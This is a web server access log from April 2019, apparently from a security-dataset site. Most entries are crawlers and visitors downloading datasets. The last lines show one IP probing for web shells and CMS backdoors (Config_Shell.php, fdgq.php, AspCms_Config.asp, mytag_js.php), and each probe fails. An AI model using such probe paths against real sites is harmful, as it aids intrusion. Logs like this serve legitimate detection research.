216.244.66.245 - - [16/Apr/2019:06:47:08 -0700] "GET /maccdc2012/maccdc2012_full_alert.7z HTTP/1.1" 200 2941900 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
66.118.76.12 - - [16/Apr/2019:06:47:36 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
66.118.76.12 - - [16/Apr/2019:06:47:36 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
66.118.76.12 - - [16/Apr/2019:06:47:36 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
66.118.76.12 - - [16/Apr/2019:06:47:37 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
66.118.76.12 - - [16/Apr/2019:06:47:41 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 165846751 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
207.46.13.57 - - [16/Apr/2019:06:51:53 -0700] "GET /self.logs/error.log.2018-05-18.gz HTTP/1.1" 200 3659 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.57 - - [16/Apr/2019:06:53:04 -0700] "GET /self.logs/access.log.2018-04-04.gz HTTP/1.1" 200 55565 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
41.223.160.131 - - [16/Apr/2019:06:55:09 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
40.77.167.92 - - [16/Apr/2019:06:56:26 -0700] "GET /self.logs/access.log.2018-04-26.gz HTTP/1.1" 200 27237 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.92 - - [16/Apr/2019:06:57:32 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/ssl.html HTTP/1.1" 200 1754 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.92 - - [16/Apr/2019:07:01:28 -0700] "GET /self.logs/error.log.2018-07-20.gz HTTP/1.1" 200 6634 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.57 - - [16/Apr/2019:07:01:32 -0700] "GET /self.logs/error.log.2018-03-29.gz HTTP/1.1" 200 4179 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.171.224.176 - - [16/Apr/2019:07:04:51 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
95.108.225.232 - - [16/Apr/2019:07:05:55 -0700] "GET / HTTP/1.1" 200 12455 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 YaBrowser/19.3.1.887 Yowser/2.5 Safari/537.36" 
95.108.225.232 - - [16/Apr/2019:07:05:56 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27732 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 YaBrowser/19.3.1.887 Yowser/2.5 Safari/537.36" 
95.108.225.232 - - [16/Apr/2019:07:05:56 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7372 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 YaBrowser/19.3.1.887 Yowser/2.5 Safari/537.36" 
95.108.225.232 - - [16/Apr/2019:07:05:59 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 534 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 YaBrowser/19.3.1.887 Yowser/2.5 Safari/537.36" 
100.43.90.103 - - [16/Apr/2019:07:06:42 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
100.43.90.103 - - [16/Apr/2019:07:06:46 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
40.77.167.92 - - [16/Apr/2019:07:10:44 -0700] "GET /self.logs/2015/error.log.2015-08-30.gz HTTP/1.1" 200 638 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
106.120.173.100 - - [16/Apr/2019:07:13:21 -0700] "GET /robots.txt HTTP/1.1" 301 481 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.120.173.100 - - [16/Apr/2019:07:13:21 -0700] "GET / HTTP/1.1" 301 446 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.120.173.100 - - [16/Apr/2019:07:13:27 -0700] "GET /robots.txt HTTP/1.1" 200 252 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.120.173.100 - - [16/Apr/2019:07:14:31 -0700] "GET / HTTP/1.1" 200 12474 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
66.102.9.143 - - [16/Apr/2019:07:15:50 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.102.9.143 - - [16/Apr/2019:07:15:50 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
216.244.66.245 - - [16/Apr/2019:07:18:39 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
41.223.160.131 - - [16/Apr/2019:07:20:48 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
13.66.139.0 - - [16/Apr/2019:07:21:00 -0700] "GET /Datasets%20Description/PE_malware/ HTTP/1.1" 301 540 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.92 - - [16/Apr/2019:07:23:22 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
129.173.212.69 - - [16/Apr/2019:07:26:52 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
129.173.212.69 - - [16/Apr/2019:07:26:52 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 340 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
129.173.212.69 - - [16/Apr/2019:07:26:54 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
129.173.212.69 - - [16/Apr/2019:07:26:54 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
129.173.212.69 - - [16/Apr/2019:07:26:54 -0700] "GET / HTTP/1.1" 200 12510 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1" 
129.173.212.69 - - [16/Apr/2019:07:26:54 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 339 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
129.173.212.69 - - [16/Apr/2019:07:26:54 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
129.173.212.69 - - [16/Apr/2019:07:26:54 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
40.77.167.92 - - [16/Apr/2019:07:27:22 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.57 - - [16/Apr/2019:07:29:11 -0700] "GET /self.logs/access.log.2017-08-17.gz HTTP/1.1" 200 21358 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
216.244.66.245 - - [16/Apr/2019:07:34:21 -0700] "GET /maccdc2012/weird.log.gz HTTP/1.1" 200 1252688 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
207.46.13.57 - - [16/Apr/2019:07:39:58 -0700] "GET /self.logs/access.log.2017-10-07.gz HTTP/1.1" 200 26519 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.92 - - [16/Apr/2019:07:49:17 -0700] "GET /self.logs/access.log.2017-05-17.gz HTTP/1.1" 200 30328 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.2 - - [16/Apr/2019:07:52:59 -0700] "GET /self.logs/access.log.2018-08-14.gz HTTP/1.1" 200 28000 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.57 - - [16/Apr/2019:07:53:25 -0700] "GET /self.logs/error.log.2017-07-19.gz HTTP/1.1" 200 946 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.57 - - [16/Apr/2019:07:53:56 -0700] "GET /self.logs/error.log.2019-03-14.gz HTTP/1.1" 200 5773 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.57 - - [16/Apr/2019:07:54:36 -0700] "GET /self.logs/2016/access.log.2016-08-06.gz HTTP/1.1" 200 18525 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.2 - - [16/Apr/2019:07:59:40 -0700] "GET /self.logs/2016/error.log.2016-02-21.gz HTTP/1.1" 200 784 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.171.224.176 - - [16/Apr/2019:08:05:10 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
81.211.32.158 - - [16/Apr/2019:08:12:23 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Safari/605.1.15" 
98.142.72.2 - - [16/Apr/2019:08:15:05 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0" 
98.142.72.2 - - [16/Apr/2019:08:15:06 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0" 
98.142.72.2 - - [16/Apr/2019:08:15:06 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0" 
98.142.72.2 - - [16/Apr/2019:08:15:06 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0" 
98.142.72.2 - - [16/Apr/2019:08:15:06 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0" 
207.46.13.2 - - [16/Apr/2019:08:16:06 -0700] "GET /self.logs/access.log.2018-11-06.gz HTTP/1.1" 200 17658 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
98.142.72.2 - - [16/Apr/2019:08:16:15 -0700] "GET /maccdc2012/tunnel.log.gz HTTP/1.1" 200 5229 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0" 
207.46.13.2 - - [16/Apr/2019:08:17:52 -0700] "GET /self.logs/error.log.2019-02-26.gz HTTP/1.1" 200 4648 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.92 - - [16/Apr/2019:08:20:37 -0700] "GET /self.logs/2015/access.log.2015-12-03.gz HTTP/1.1" 200 5188 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
109.251.1.174 - - [16/Apr/2019:08:21:31 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb/ HTTP/1.1" 301 505 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36" 
109.251.1.174 - - [16/Apr/2019:08:21:32 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb/ HTTP/1.1" 404 303 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36" 
40.77.167.92 - - [16/Apr/2019:08:29:46 -0700] "GET /self.logs/access.log.2015-07-08.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
195.16.11.230 - - [16/Apr/2019:08:36:05 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0" 
195.16.11.230 - - [16/Apr/2019:08:36:05 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0" 
195.16.11.230 - - [16/Apr/2019:08:36:05 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0" 
195.16.11.230 - - [16/Apr/2019:08:36:05 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0" 
40.77.167.92 - - [16/Apr/2019:08:38:46 -0700] "GET /self.logs/access.log.2017-06-06.gz HTTP/1.1" 200 31715 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.92 - - [16/Apr/2019:08:39:36 -0700] "GET /self.logs/2016/access.log.2016-08-24.gz HTTP/1.1" 200 7487 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.2 - - [16/Apr/2019:08:39:50 -0700] "GET /self.logs/access.log.2018-10-03.gz HTTP/1.1" 200 29165 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.57 - - [16/Apr/2019:08:40:35 -0700] "GET /self.logs/access.log.2018-10-12.gz HTTP/1.1" 200 18648 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
81.247.106.16 - - [16/Apr/2019:08:42:16 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
81.247.106.16 - - [16/Apr/2019:08:42:16 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
81.247.106.16 - - [16/Apr/2019:08:42:17 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
81.247.106.16 - - [16/Apr/2019:08:42:17 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
81.247.106.16 - - [16/Apr/2019:08:42:21 -0700] "GET /misc/zeus_dga_domains.txt.zip HTTP/1.1" 200 594360 "-" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
40.77.167.92 - - [16/Apr/2019:08:43:31 -0700] "GET /self.logs/access.log.2017-04-06.gz HTTP/1.1" 200 31690 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
81.247.106.16 - - [16/Apr/2019:08:52:38 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 200 6629420 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
178.90.44.251 - - [16/Apr/2019:08:54:06 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0" 
178.90.44.251 - - [16/Apr/2019:08:54:06 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "-" "Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0" 
178.90.44.251 - - [16/Apr/2019:08:54:10 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 206 34291 "-" "Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0" 
178.90.44.251 - - [16/Apr/2019:08:54:10 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0" 
178.90.44.251 - - [16/Apr/2019:08:54:10 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 206 65867 "-" "Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0" 
40.77.167.92 - - [16/Apr/2019:08:55:09 -0700] "GET /self.logs/error.log.2019-02-15.gz HTTP/1.1" 200 4459 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.57 - - [16/Apr/2019:09:03:19 -0700] "GET /self.logs/access.log.2017-06-24.gz HTTP/1.1" 200 32850 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.121.240.49 - - [16/Apr/2019:09:07:03 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 615513 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
113.121.240.49 - - [16/Apr/2019:09:07:41 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 615513 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
207.46.13.2 - - [16/Apr/2019:09:10:52 -0700] "GET /self.logs/access.log.2018-02-16.gz HTTP/1.1" 200 40412 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.171.224.176 - - [16/Apr/2019:09:11:29 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
68.108.67.48 - - [16/Apr/2019:09:12:32 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
68.108.67.48 - - [16/Apr/2019:09:12:32 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
68.108.67.48 - - [16/Apr/2019:09:12:32 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
68.108.67.48 - - [16/Apr/2019:09:12:32 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
68.108.67.48 - - [16/Apr/2019:09:12:33 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
68.108.67.48 - - [16/Apr/2019:09:13:38 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 200 4274093 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
68.108.67.48 - - [16/Apr/2019:09:15:34 -0700] "GET /tg/tg_snort_full.7z HTTP/1.1" 200 8847794 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
100.27.37.89 - - [16/Apr/2019:09:16:16 -0700] "GET / HTTP/1.1" 301 446 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring" 
100.27.37.89 - - [16/Apr/2019:09:16:16 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring" 
80.178.150.40 - - [16/Apr/2019:09:17:08 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
80.178.150.40 - - [16/Apr/2019:09:17:08 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 340 "-" "Safari/14606.3.4 CFNetwork/976 Darwin/18.2.0 (x86_64)" 
80.178.150.40 - - [16/Apr/2019:09:17:08 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/14606.3.4 CFNetwork/976 Darwin/18.2.0 (x86_64)" 
80.178.150.40 - - [16/Apr/2019:09:17:08 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/14606.3.4 CFNetwork/976 Darwin/18.2.0 (x86_64)" 
80.178.150.40 - - [16/Apr/2019:09:17:09 -0700] "GET / HTTP/1.1" 200 12510 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1" 
80.178.150.40 - - [16/Apr/2019:09:17:09 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 339 "-" "Safari/14606.3.4 CFNetwork/976 Darwin/18.2.0 (x86_64)" 
80.178.150.40 - - [16/Apr/2019:09:17:09 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/14606.3.4 CFNetwork/976 Darwin/18.2.0 (x86_64)" 
80.178.150.40 - - [16/Apr/2019:09:17:10 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/14606.3.4 CFNetwork/976 Darwin/18.2.0 (x86_64)" 
207.46.13.57 - - [16/Apr/2019:09:17:22 -0700] "GET /self.logs/access.log.2018-04-17.gz HTTP/1.1" 200 23484 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.57 - - [16/Apr/2019:09:17:23 -0700] "GET /self.logs/2015/error.log.2015-03-20.gz HTTP/1.1" 200 939 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.2 - - [16/Apr/2019:09:18:20 -0700] "GET /self.logs/error.log.2017-10-08.gz HTTP/1.1" 200 1859 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
222.90.67.203 - - [16/Apr/2019:09:21:05 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
68.108.67.48 - - [16/Apr/2019:09:21:20 -0700] "GET /Datasets%20Description/Network/dhcp.html HTTP/1.1" 200 1355 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
68.108.67.48 - - [16/Apr/2019:09:21:20 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/Datasets%20Description/Network/dhcp.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
68.108.67.48 - - [16/Apr/2019:09:21:40 -0700] "GET /Datasets%20Description/Network/dns.html HTTP/1.1" 200 1437 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
122.114.146.180 - - [16/Apr/2019:09:21:48 -0700] "POST //Config_Shell.php HTTP/1.1" 301 530 "http://secrepo.com//Config_Shell.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:21:50 -0700] "GET /Config_Shell.php HTTP/1.1" 404 295 "http://secrepo.com//Config_Shell.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:21:51 -0700] "POST //fdgq.php HTTP/1.1" 301 514 "http://secrepo.com//fdgq.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:21:53 -0700] "POST //config/AspCms_Config.asp HTTP/1.1" 301 545 "http://secrepo.com//config/AspCms_Config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:21:54 -0700] "GET /config/AspCms_Config.asp HTTP/1.1" 404 295 "http://secrepo.com//config/AspCms_Config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:21:54 -0700] "POST //plus/mytag_js.php?aid=511348 HTTP/1.1" 301 553 "http://secrepo.com//plus/mytag_js.php?aid=511348" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:21:54 -0700] "GET /plus/mytag_js.php?aid=511348 HTTP/1.1" 404 294 "http://secrepo.com//plus/mytag_js.php?aid=511348" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:21:55 -0700] "POST //plus/mytag_js.php?aid=9527 HTTP/1.1" 301 549 "http://secrepo.com//plus/mytag_js.php?aid=9527" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.146.180 - - [16/Apr/2019:09:21:55 -0700] "GET /plus/mytag_js.php?aid=9527 HTTP/1.1" 404 294 "http://secrepo.com//plus/mytag_js.php?aid=9527" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
